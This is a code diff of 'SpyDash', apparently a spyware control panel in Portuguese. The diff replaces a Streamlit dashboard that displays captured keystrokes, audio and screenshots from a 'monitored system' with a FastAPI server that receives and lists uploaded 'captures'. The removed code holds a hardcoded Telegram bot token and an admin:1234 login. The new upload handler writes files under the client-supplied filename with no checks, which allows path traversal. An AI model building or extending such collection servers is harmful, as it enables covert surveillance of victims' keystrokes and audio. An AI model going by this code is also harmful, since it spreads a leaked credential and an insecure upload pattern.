@@ -1,60 +1,33 @@
-import streamlit as st
 import os
-import requests
-from PIL import Image
+import shutil
+from fastapi import FastAPI, UploadFile, File
+from fastapi.responses import HTMLResponse
+from fastapi.staticfiles import StaticFiles
 
-# === Configuração Telegram ===
-BOT_TOKEN = "8169475379:AAEM3RqcruOrbFd0dBKUMzwDZ5gRPl-FqxU"
-CHAT_ID = "5672315001"
+app = FastAPI()
 
-def enviar_telegram(mensagem):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {"chat_id": CHAT_ID, "text": mensagem}
-    try:
-        requests.post(url, data=data)
-    except:
-        pass
+# Diretório onde os arquivos capturados serão armazenados
+UPLOAD_DIR = "uploads"
+os.makedirs(UPLOAD_DIR, exist_ok=True)
 
-# === Login simples ===
-USUARIOS = {"admin": "1234"}
+# Tornar os arquivos acessíveis via navegador
+app.mount("/uploads", StaticFiles(directory=UPLOAD_DIR), name="uploads")
 
-def autenticar():
-    st.title("🔐 Acesso Restrito - SpyDash")
-    usuario = st.text_input("Usuário")
-    senha = st.text_input("Senha", type="password")
-    if st.button("Entrar"):
-        if usuario in USUARIOS and USUARIOS[usuario] == senha:
-            st.session_state["logado"] = True
-        else:
-            st.error("Usuário ou senha incorretos.")
+@app.get("/")
+def home():
+    arquivos = os.listdir(UPLOAD_DIR)
+    lista_html = "".join(
+        f"<li><a href='/uploads/{arq}' target='_blank'>{arq}</a></li>" for arq in arquivos
+    )
+    return HTMLResponse(f"""
+    <h1>🕵️ SpyDash - Painel de Monitoramento</h1>
+    <h3>📡 Capturas Recebidas</h3>
+    <ul>{lista_html}</ul>
+    """)
 
-if "logado" not in st.session_state or not st.session_state["logado"]:
-    autenticar()
-    st.stop()
-
-# === Painel principal ===
-st.set_page_config(page_title="SpyDash", layout="wide")
-st.title("🕵️ SpyDash - Painel de Monitoramento")
-st.markdown("### Capturas em tempo real")
-st.write("Este painel exibirá capturas de teclado, áudio e prints do sistema monitorado.")
-
-# Notifica ao Telegram que o painel foi acessado
-enviar_telegram("✅ SpyDash foi iniciado e está ao vivo no painel de monitoramento.")
-
-# Exibir arquivos da pasta 'provas'
-pasta = "provas"
-if not os.path.exists(pasta):
-    st.info("Nenhuma captura foi registrada ainda.")
-else:
-    arquivos = sorted(os.listdir(pasta), reverse=True)
-    for arq in arquivos:
-        caminho = os.path.join(pasta, arq)
-        st.markdown(f"#### 📁 {arq}")
-        if arq.endswith(".txt"):
-            with open(caminho, "r", encoding="utf-8") as f:
-                st.code(f.read(), language="text")
-        elif arq.endswith(".wav"):
-            st.audio(caminho)
-        elif arq.endswith((".png", ".jpg", ".jpeg")):
-            st.image(Image.open(caminho))
-        st.markdown("---")
+@app.post("/upload")
+async def upload(file: UploadFile = File(...)):
+    destino = os.path.join(UPLOAD_DIR, file.filename)
+    with open(destino, "wb") as buffer:
+        shutil.copyfileobj(file.file, buffer)
+    return {"status": "ok", "filename": file.filename}
